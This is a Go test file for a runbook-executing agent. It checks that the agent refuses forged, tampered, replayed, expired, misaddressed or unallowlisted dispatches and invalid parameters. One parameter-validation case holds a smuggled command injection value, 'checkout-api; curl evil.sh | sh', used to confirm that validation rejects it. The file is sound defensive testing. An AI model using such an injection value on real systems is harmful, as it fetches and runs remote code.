package agent

// The agent's own refusals (agent-protocol.md §6.3). The agent must not trust
// the control plane blindly: every check in verify has to reject a dispatch
// before anything runs. Each test serves one dispatch from a fake gateway, lets
// the agent poll once, and asserts that it acked Accepted:false, made no AWS
// call and reported no result.

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/peacedouts/nightfix/internal/agentapi"
	"github.com/peacedouts/nightfix/internal/runbook"
	"github.com/peacedouts/nightfix/internal/signing"
)

// verifyRunbook has one step an agent can run (an AWS call, recorded by
// recordingAWS) and two it must refuse: a control-plane note and an http step
// this build's agent doesn't support.
const verifyRunbook = `apiVersion: nightfix.dev/v1alpha1
kind: Runbook
metadata:
  name: ecs-restart
  title: Restart an ECS service
spec:
  parameters:
    service:
      type: string
      required: true
      pattern: "^[a-z][a-z0-9-]{0,62}$"
  target:
    agentSelector:
      env: prod
  steps:
    - id: restart
      type: aws
      service: ecs
      action: UpdateService
      input:
        cluster: prod-east
        service: ${{ params.service }}
        forceNewDeployment: true
    - id: context
      type: note
      markdown: Posted by the control plane; never run by an agent.
    - id: probe
      type: http
      url: https://example.com/health
`

const (
	testOrgID   = "org-under-test"
	testAgentID = "agent-under-test"
)

// recordingAWS stands in for the customer's AWS account: any call means a
// step executed.
type recordingAWS struct {
	mu    sync.Mutex
	calls []string
}

func (r *recordingAWS) Call(_ context.Context, service, action string, _ map[string]any) (map[string]any, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.calls = append(r.calls, service+":"+action)
	return map[string]any{}, nil
}

func (r *recordingAWS) count() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	return len(r.calls)
}

// fakeGateway is a control plane that hands out queued dispatches on poll and
// records the agent's acks and results.
type fakeGateway struct {
	mu      sync.Mutex
	queue   []agentapi.Dispatch
	acks    map[string][]agentapi.Ack
	results map[string][]agentapi.Result
}

func (g *fakeGateway) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	g.mu.Lock()
	defer g.mu.Unlock()
	path := r.URL.Path
	attempt := strings.TrimPrefix(path, "/agent/v1/attempts/")
	switch {
	case path == "/agent/v1/poll":
		var resp agentapi.PollResponse
		if len(g.queue) > 0 {
			resp.Dispatch = &g.queue[0]
			g.queue = g.queue[1:]
		}
		json.NewEncoder(w).Encode(resp)
		return
	case strings.HasSuffix(path, "/ack"):
		var ack agentapi.Ack
		json.NewDecoder(r.Body).Decode(&ack)
		id := strings.TrimSuffix(attempt, "/ack")
		g.acks[id] = append(g.acks[id], ack)
	case strings.HasSuffix(path, "/result"):
		var res agentapi.Result
		json.NewDecoder(r.Body).Decode(&res)
		id := strings.TrimSuffix(attempt, "/result")
		g.results[id] = append(g.results[id], res)
	}
	w.Write([]byte("{}")) // output, heartbeat
}

type verifyFixture struct {
	t      *testing.T
	cp     signing.Key // the control plane's key: signs bundles and envelopes
	gw     *fakeGateway
	aws    *recordingAWS
	agent  *Agent
	bundle signing.Bundle // verifyRunbook, signed by cp
}

// newVerifyFixture builds an enrolled agent (labels env=prod) that trusts cp
// for bundles and envelopes. cfg carries the local settings under test
// (freeze, pinned signers, allowlist).
func newVerifyFixture(t *testing.T, cfg Config) *verifyFixture {
	t.Helper()
	cp, err := signing.GenerateKey("nightfix-org")
	if err != nil {
		t.Fatal(err)
	}
	f := &verifyFixture{t: t, cp: cp, aws: &recordingAWS{},
		gw: &fakeGateway{acks: map[string][]agentapi.Ack{}, results: map[string][]agentapi.Result{}}}
	srv := httptest.NewServer(f.gw)
	t.Cleanup(srv.Close)

	cfg.Endpoint = srv.URL
	cfg.AWS = f.aws
	cfg.Log = slog.New(slog.NewTextHandler(io.Discard, nil))
	if f.agent, err = New(cfg); err != nil {
		t.Fatal(err)
	}
	f.agent.id = &identity{AgentID: testAgentID, OrgID: testOrgID, Labels: map[string]string{"env": "prod"},
		Trust: signing.TrustConfig{
			Keys:            map[string]string{cp.ID: pubB64(cp)},
			RequiredSigners: []string{cp.ID},
			EnvelopeSigners: []string{cp.ID},
		}}
	f.bundle = f.signedBundle(verifyRunbook, cp)
	return f
}

func pubB64(k signing.Key) string { return base64.StdEncoding.EncodeToString(k.Public) }

func newKey(t *testing.T, prefix string) signing.Key {
	t.Helper()
	k, err := signing.GenerateKey(prefix)
	if err != nil {
		t.Fatal(err)
	}
	return k
}

// signedBundle publishes src as version 1, signed by each of signers.
func (f *verifyFixture) signedBundle(src string, signers ...signing.Key) signing.Bundle {
	f.t.Helper()
	rb, err := runbook.Parse([]byte(src))
	if err != nil {
		f.t.Fatal(err)
	}
	c, digest, err := runbook.Canonical(rb)
	if err != nil {
		f.t.Fatal(err)
	}
	b := signing.Bundle{Name: rb.Metadata.Name, Version: 1, Digest: digest, CanonicalJSON: string(c)}
	for _, k := range signers {
		b.Signatures = append(b.Signatures, signing.SignDigest(k, digest))
	}
	return b
}

var attemptSeq atomic.Int64

// envelope is a valid envelope for step 0 of f.bundle, addressed to this
// agent; mutate changes one thing about it.
func (f *verifyFixture) envelope(mutate func(*signing.Envelope)) signing.Envelope {
	now := time.Now()
	e := signing.Envelope{
		AttemptID: fmt.Sprintf("att-%d", attemptSeq.Add(1)),
		RunID:     "run-1", StepID: "restart", StepIndex: 0, AttemptNumber: 1,
		RunbookDigest: f.bundle.Digest, AgentID: testAgentID, OrgID: testOrgID,
		Params: map[string]any{"service": "checkout-api"}, Context: map[string]any{},
		IssuedAt: now.UnixMilli(), ExpiresAt: now.Add(2 * time.Minute).UnixMilli(), RequestedBy: "trigger:test",
	}
	if mutate != nil {
		mutate(&e)
	}
	return e
}

func (f *verifyFixture) seal(k signing.Key, e signing.Envelope) signing.SignedEnvelope {
	f.t.Helper()
	se, err := signing.SealEnvelope(k, e)
	if err != nil {
		f.t.Fatal(err)
	}
	return se
}

// dispatch is f.bundle plus a control-plane-signed envelope.
func (f *verifyFixture) dispatch(mutate func(*signing.Envelope)) agentapi.Dispatch {
	return agentapi.Dispatch{Bundle: f.bundle, Envelope: f.seal(f.cp, f.envelope(mutate))}
}

// deliver serves d on the agent's next poll and returns the agent's ack.
func (f *verifyFixture) deliver(d agentapi.Dispatch) agentapi.Ack {
	f.t.Helper()
	f.gw.mu.Lock()
	f.gw.queue = append(f.gw.queue, d)
	f.gw.mu.Unlock()
	// Not cancelled on return: an accepted step reports its result with it.
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	f.t.Cleanup(cancel)
	if err := f.agent.pollOnce(ctx); err != nil {
		f.t.Fatalf("poll: %v", err)
	}
	id := attemptIDOf(d)
	f.gw.mu.Lock()
	defer f.gw.mu.Unlock()
	acks := f.gw.acks[id]
	if len(acks) == 0 {
		f.t.Fatalf("the agent never acked attempt %s", id)
	}
	return acks[len(acks)-1]
}

// assertRefused delivers d and checks the agent rejected it, for a reason
// containing want, without running anything.
func (f *verifyFixture) assertRefused(d agentapi.Dispatch, want string) {
	f.t.Helper()
	ranBefore, resultsBefore := f.aws.count(), f.results(d)
	ack := f.deliver(d)
	if ack.Accepted {
		time.Sleep(200 * time.Millisecond) // let the step run, to report what it did
		f.t.Fatalf("dispatch accepted (AWS calls: %d); want it refused with %q", f.aws.count()-ranBefore, want)
	}
	if !strings.Contains(ack.Reason, want) {
		f.t.Fatalf("refused with %q; want a reason containing %q", ack.Reason, want)
	}
	if n := f.aws.count() - ranBefore; n != 0 {
		f.t.Fatalf("a refused dispatch made %d AWS call(s)", n)
	}
	if n := f.results(d) - resultsBefore; n != 0 {
		f.t.Fatalf("a refused dispatch reported %d result(s)", n)
	}
}

func (f *verifyFixture) results(d agentapi.Dispatch) int {
	f.gw.mu.Lock()
	defer f.gw.mu.Unlock()
	return len(f.gw.results[attemptIDOf(d)])
}

// assertRuns delivers d and checks the agent accepted and executed it: the
// positive control that shows a refusal was caused by the one thing changed.
func (f *verifyFixture) assertRuns(d agentapi.Dispatch) {
	f.t.Helper()
	ranBefore := f.aws.count()
	if ack := f.deliver(d); !ack.Accepted {
		f.t.Fatalf("dispatch refused (%s); want it to run", ack.Reason)
	}
	id := attemptIDOf(d)
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		f.gw.mu.Lock()
		results := f.gw.results[id]
		f.gw.mu.Unlock()
		if len(results) > 0 {
			res := results[0]
			if res.Status != "succeeded" {
				f.t.Fatalf("step result %+v; want succeeded", res)
			}
			if n := f.aws.count() - ranBefore; n != 1 {
				f.t.Fatalf("step made %d AWS calls; want 1", n)
			}
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
	f.t.Fatal("accepted step never reported a result")
}

func TestAgentRefusesWorkWhenFrozenLocally(t *testing.T) {
	f := newVerifyFixture(t, Config{Freeze: true})
	// The control plane shouldn't dispatch to a frozen agent; if it does
	// anyway, the local kill switch still wins.
	f.assertRefused(f.dispatch(nil), "frozen locally")
}

func TestAgentRefusesUntrustedEnvelope(t *testing.T) {
	cases := []struct {
		name string
		// make builds the dispatch; trust may be adjusted first.
		make func(f *verifyFixture) agentapi.Dispatch
		want string
	}{
		{"payload altered after signing", func(f *verifyFixture) agentapi.Dispatch {
			d := f.dispatch(nil)
			d.Envelope.Payload = strings.Replace(d.Envelope.Payload, `"checkout-api"`, `"billing-api"`, 1)
			return d
		}, "signature is invalid"},
		{"control-plane key id with a signature from another key", func(f *verifyFixture) agentapi.Dispatch {
			se := f.seal(newKey(t, "forger"), f.envelope(nil))
			se.KeyID = f.cp.ID
			return agentapi.Dispatch{Bundle: f.bundle, Envelope: se}
		}, "signature is invalid"},
		{"signed by a bundle co-signer, not an envelope signer", func(f *verifyFixture) agentapi.Dispatch {
			// Customer co-signers are trusted for bundles but must never be
			// able to dispatch work on their own.
			cosigner := newKey(t, "acme-ci")
			f.agent.id.Trust.Keys[cosigner.ID] = pubB64(cosigner)
			f.agent.id.Trust.RequiredSigners = append(f.agent.id.Trust.RequiredSigners, cosigner.ID)
			f.bundle = f.signedBundle(verifyRunbook, f.cp, cosigner)
			return agentapi.Dispatch{Bundle: f.bundle, Envelope: f.seal(cosigner, f.envelope(nil))}
		}, "not a control-plane key"},
		{"signed by an unknown key", func(f *verifyFixture) agentapi.Dispatch {
			return agentapi.Dispatch{Bundle: f.bundle, Envelope: f.seal(newKey(t, "stranger"), f.envelope(nil))}
		}, "not a control-plane key"},
		{"addressed to another agent", func(f *verifyFixture) agentapi.Dispatch {
			return f.dispatch(func(e *signing.Envelope) { e.AgentID = "some-other-agent" })
		}, "not this agent"},
		{"addressed to another org", func(f *verifyFixture) agentapi.Dispatch {
			return f.dispatch(func(e *signing.Envelope) { e.OrgID = "some-other-org" })
		}, "not this agent's org"},
		{"expired beyond the clock-skew allowance", func(f *verifyFixture) agentapi.Dispatch {
			return f.dispatch(func(e *signing.Envelope) {
				e.IssuedAt = time.Now().Add(-5 * time.Minute).UnixMilli()
				e.ExpiresAt = time.Now().Add(-signing.MaxClockSkew - 5*time.Second).UnixMilli()
			})
		}, "expired"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := newVerifyFixture(t, Config{})
			f.assertRefused(c.make(f), c.want)
		})
	}
}

func TestAgentRefusesReplayedAttempt(t *testing.T) {
	f := newVerifyFixture(t, Config{})
	d := f.dispatch(nil)
	f.assertRuns(d)

	// The identical dispatch delivered again (a replay, or a control-plane bug).
	f.assertRefused(d, "replay")

	// A freshly signed envelope reusing the attempt id is still a replay.
	var first signing.Envelope
	if err := json.Unmarshal([]byte(d.Envelope.Payload), &first); err != nil {
		t.Fatal(err)
	}
	again := f.dispatch(func(e *signing.Envelope) {
		e.AttemptID = first.AttemptID
		e.IssuedAt = time.Now().UnixMilli()
		e.ExpiresAt = time.Now().Add(2 * time.Minute).UnixMilli()
	})
	f.assertRefused(again, "replay")
}

func TestAgentRefusesBundleThatIsNotTheEnvelopesRunbook(t *testing.T) {
	t.Run("envelope pins a different digest", func(t *testing.T) {
		f := newVerifyFixture(t, Config{})
		f.assertRefused(f.dispatch(func(e *signing.Envelope) { e.RunbookDigest = "sha256:" + strings.Repeat("0", 64) }),
			"envelope digest does not match the bundle")
	})
	t.Run("bundle content swapped under the signed digest", func(t *testing.T) {
		f := newVerifyFixture(t, Config{})
		d := f.dispatch(nil)
		d.Bundle.CanonicalJSON = strings.Replace(d.Bundle.CanonicalJSON, "prod-east", "prod-west", 1)
		f.assertRefused(d, "bundle digest mismatch")
	})
}

func TestAgentRefusesBundleMissingRequiredSigner(t *testing.T) {
	t.Run("unsigned bundle", func(t *testing.T) {
		f := newVerifyFixture(t, Config{})
		d := f.dispatch(nil)
		d.Bundle.Signatures = nil
		f.assertRefused(d, "missing a valid signature from required signer "+f.cp.ID)
	})
	t.Run("different runbook re-pointed by a matching envelope", func(t *testing.T) {
		// Content and both digests agree, but nobody signed this content.
		f := newVerifyFixture(t, Config{})
		unsigned := f.signedBundle(strings.Replace(verifyRunbook, "prod-east", "prod-west", 1))
		unsigned.Signatures = f.bundle.Signatures // signatures over the old digest
		f.bundle = unsigned
		f.assertRefused(f.dispatch(nil), "missing a valid signature from required signer "+f.cp.ID)
	})
	t.Run("co-signer required by the control plane", func(t *testing.T) {
		f := newVerifyFixture(t, Config{})
		cosigner := newKey(t, "acme-ci")
		f.agent.id.Trust.Keys[cosigner.ID] = pubB64(cosigner)
		f.agent.id.Trust.RequiredSigners = append(f.agent.id.Trust.RequiredSigners, cosigner.ID)
		f.assertRefused(f.dispatch(nil), "missing a valid signature from required signer "+cosigner.ID)
	})

	// The agent's locally pinned signer and key always win over what the
	// control plane sends.
	pinned := func(t *testing.T) (*verifyFixture, signing.Key) {
		acme := newKey(t, "acme-ci")
		f := newVerifyFixture(t, Config{RequiredSigners: []string{acme.ID}, PinnedKeys: map[string]string{acme.ID: pubB64(acme)}})
		return f, acme
	}
	t.Run("locally pinned signer the control plane doesn't require", func(t *testing.T) {
		f, acme := pinned(t)
		// The control plane's trust config only requires (and only knows) its own key.
		f.assertRefused(f.dispatch(nil), "required signer "+acme.ID)
	})
	t.Run("control plane pairs the pinned id with its own key", func(t *testing.T) {
		f, acme := pinned(t)
		forged := newKey(t, "forged")
		f.agent.id.Trust.Keys[acme.ID] = pubB64(forged)
		f.bundle.Signatures = append(f.bundle.Signatures,
			signing.SignDigest(signing.Key{ID: acme.ID, Private: forged.Private}, f.bundle.Digest))
		f.assertRefused(f.dispatch(nil), "missing a valid signature from required signer "+acme.ID)
	})
	t.Run("signed by the pinned key runs", func(t *testing.T) {
		f, acme := pinned(t)
		f.bundle = f.signedBundle(verifyRunbook, f.cp, acme)
		f.assertRuns(f.dispatch(nil))
	})
}

func writeAllowlist(t *testing.T, yaml string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "allowlist.yaml")
	if err := os.WriteFile(p, []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestAgentAllowlist(t *testing.T) {
	other := writeAllowlist(t, "runbooks:\n  - name: aurora-failover\n    version: \"*\"\n")
	t.Run("enforce refuses a runbook not on the list", func(t *testing.T) {
		f := newVerifyFixture(t, Config{AllowlistMode: "enforce", AllowlistFile: other})
		f.assertRefused(f.dispatch(nil), "not on the local allowlist")
	})
	t.Run("warn lets it run", func(t *testing.T) {
		f := newVerifyFixture(t, Config{AllowlistMode: "warn", AllowlistFile: other})
		f.assertRuns(f.dispatch(nil))
	})
	t.Run("enforce runs a digest-pinned runbook", func(t *testing.T) {
		probe := newVerifyFixture(t, Config{}) // the digest doesn't depend on the key
		list := writeAllowlist(t, "runbooks:\n  - name: ecs-restart\n    digest: "+probe.bundle.Digest+"\n")
		f := newVerifyFixture(t, Config{AllowlistMode: "enforce", AllowlistFile: list})
		f.assertRuns(f.dispatch(nil))
	})
	t.Run("enforce refuses other content under a pinned name", func(t *testing.T) {
		probe := newVerifyFixture(t, Config{})
		list := writeAllowlist(t, "runbooks:\n  - name: ecs-restart\n    digest: "+probe.bundle.Digest+"\n")
		f := newVerifyFixture(t, Config{AllowlistMode: "enforce", AllowlistFile: list})
		f.bundle = f.signedBundle(strings.Replace(verifyRunbook, "prod-east", "prod-west", 1), f.cp)
		f.assertRefused(f.dispatch(nil), "not on the local allowlist")
	})
}

// A version pin would be only as good as the version number it compares, and
// the bundle's version is not covered by any signature: a control plane could
// relabel any content it signed as the pinned version. So the agent refuses
// to load an allowlist with version pins at all (pin the digest instead).
func TestAgentAllowlistVersionPinCannotBeMetByRelabelling(t *testing.T) {
	list := writeAllowlist(t, "runbooks:\n  - name: ecs-restart\n    version: \"3\"\n")
	if _, err := loadAllowlist(list); err == nil || !strings.Contains(err.Error(), "digest") {
		t.Fatalf("an allowlist with a version pin loaded: %v", err)
	}
}

func TestAgentRefusesStepNotInRunbook(t *testing.T) {
	cases := map[string]func(*signing.Envelope){
		"id does not match the index": func(e *signing.Envelope) { e.StepID = "context" },
		"index past the last step":    func(e *signing.Envelope) { e.StepIndex, e.StepID = 3, "restart" },
		"negative index":              func(e *signing.Envelope) { e.StepIndex = -1 },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			f := newVerifyFixture(t, Config{})
			f.assertRefused(f.dispatch(mutate), "envelope step does not exist in the runbook")
		})
	}
}

func TestAgentRefusesUnsupportedStepType(t *testing.T) {
	cases := map[string]func(*signing.Envelope){
		`step type "note"`: func(e *signing.Envelope) { e.StepIndex, e.StepID = 1, "context" }, // control-plane step
		`step type "http"`: func(e *signing.Envelope) { e.StepIndex, e.StepID = 2, "probe" },   // not in this build
	}
	for want, mutate := range cases {
		t.Run(want, func(t *testing.T) {
			f := newVerifyFixture(t, Config{})
			f.assertRefused(f.dispatch(mutate), want+" is not supported by this agent")
		})
	}
}

func TestAgentRefusesParametersFailingLocalValidation(t *testing.T) {
	cases := map[string]map[string]any{
		"pattern mismatch (injection)": {"service": "checkout-api; curl evil.sh | sh"},
		"wrong type":                   {"service": 42},
		"unknown parameter":            {"service": "checkout-api", "cluster": "prod-west"},
		"required parameter missing":   {},
	}
	for name, params := range cases {
		t.Run(name, func(t *testing.T) {
			f := newVerifyFixture(t, Config{})
			f.assertRefused(f.dispatch(func(e *signing.Envelope) { e.Params = params }), "parameters failed local validation")
		})
	}
}

func TestAgentRefusesRunbookTargetingOtherAgents(t *testing.T) {
	for name, labels := range map[string]map[string]string{
		"different value": {"env": "staging"},
		"label missing":   {"team": "platform"},
	} {
		t.Run(name, func(t *testing.T) {
			f := newVerifyFixture(t, Config{})
			f.agent.id.Labels = labels
			f.assertRefused(f.dispatch(nil), "runbook targets env=prod")
		})
	}
}
